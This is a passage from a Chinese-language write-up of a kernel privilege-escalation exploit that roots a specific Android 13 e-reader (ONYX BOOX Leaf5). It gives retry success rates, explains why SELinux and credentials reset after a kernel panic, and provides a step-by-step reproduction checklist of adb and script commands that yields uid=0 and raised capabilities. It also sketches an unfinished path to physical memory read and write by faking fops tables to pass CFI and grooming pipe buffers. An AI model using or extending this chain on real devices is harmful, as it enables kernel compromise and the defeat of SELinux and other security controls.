| **C13** | 内核必须是 `4.19.157-perf-g77c132eccfab-dirty` **#38**（ONYX BOOX Leaf5 / Android 13 / 固件 `4.2.3-rel_0928_656b72278`） | 所有偏移来自这一版 | 换固件或内核号要重做 `target.h` |

### 8.1 成功率与重试

```
单轮 p ≈ 2/3
n 次独立重试: 1 - (1/3)^n

n=3 → 96.3%
n=5 → 99.6%
```

要求带 `CAP_SYS_ADMIN` 时再乘 1/2：

```
n=3 → ~48%      n=6 → ~73%      n=8 → ~82%
```

### 8.2 为什么失败之后必须 reboot

失败几乎都是 kernel panic。panic 之后 `/data` 还在，但：

1. SELinux 回 Enforcing（`selinux_state` 在 .bss，重启重初始化）
2. `perf_cred_ptr` 失效（新进程、新 cred）
3. 上一轮的 daemon 死掉

⇒ 每轮从干净状态重来，不能"接着上次的继续"。

---

## 9. 复现检查单

```
[ ] 内核版本确认
    adb shell cat /proc/version          # 必须包含 #38
[ ] 产物存在
    ls out/exploit/aarch64/preload.so
[ ] 已推送且 md5 一致
    ./scripts/deploy.sh && ./scripts/run_chain.sh --check
[ ] 设备就绪
    adb shell cut -d. -f1 /proc/uptime   # ≥ 90
[ ] 起跑
    ./scripts/root_try.sh 3
[ ] 成功判据（三条同时）
    su -c "id"                → uid=0
    exec_probe.txt CapEff     ≠ 0xc0
    su -c "touch ..."         → TOUCH_OK
[ ] 可选：CAP_SYS_ADMIN
    grep 'round 3 caps' 日志  → bnd= 的 bit21 == 1
    su -c "mount -t tmpfs ..." → MOUNT_OK
```

---

## 10. 尚未完成

| 项 | 状态 | 说明 |
|----|------|------|
| `pipe_buffer` 物理读写 | 未做 | 路线：一次受限写把 `ashmem_misc.fops` 指向 payload 页假 fops 表（CFI 匹配 `ssize_t (struct kiocb *, struct iov_iter *)`，用 `configfs` handler 顶）→ 借假 fops 的 `read_iter/write_iter` 拿受限虚拟读写 → groom pipe ring（order-3 页 + skb spray）把 `pipe_buffer.page` 换成目标 PFN 的 `struct page *` → pipe 读写 = 物理内存读写 |
| cap 掩码抬到 `0x3ffffff` | 未测 | 改 `fops.c:364` 的 `+0x1cf`；障碍同 §2.3（`+0x2001cf` 处 .bss 不一定映射） |
| 持久化到 `/system` | 不可能 | dm-verity（C10） |
| 启动即 root | 未做 | 需要可信的早期注入点；目前靠 `device_root.sh` 手工恢复 |

---

*本文所有数值来自 `logs/` 与 pstore 转储的实测输出，未做外推。*
